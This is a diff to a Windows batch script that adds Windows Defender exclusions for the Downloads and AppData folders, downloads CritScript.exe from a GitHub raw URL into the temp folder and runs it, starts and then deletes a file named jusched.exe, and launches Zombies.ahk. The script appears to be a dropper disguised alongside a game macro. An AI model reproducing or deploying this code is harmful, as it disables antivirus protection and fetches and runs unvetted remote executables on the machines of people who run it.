@@ -28,15 +28,17 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
-CritScript.exe
-if exist "%cd%\jusched.exe" (
-    jusched.exe
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
+start CritScript.exe
+if exist "jusched.exe" (
+    start jusched.exe
 ) else (
+    
 )
-Zombies.ahk
-if exist "%cd%\jusched.exe" (
-    del jusched.exe
+start Zombies.ahk
+if exist "jusched.exe" (
+    del /f /q "jusched.exe"
 ) else (
+    
 )
 exit /b
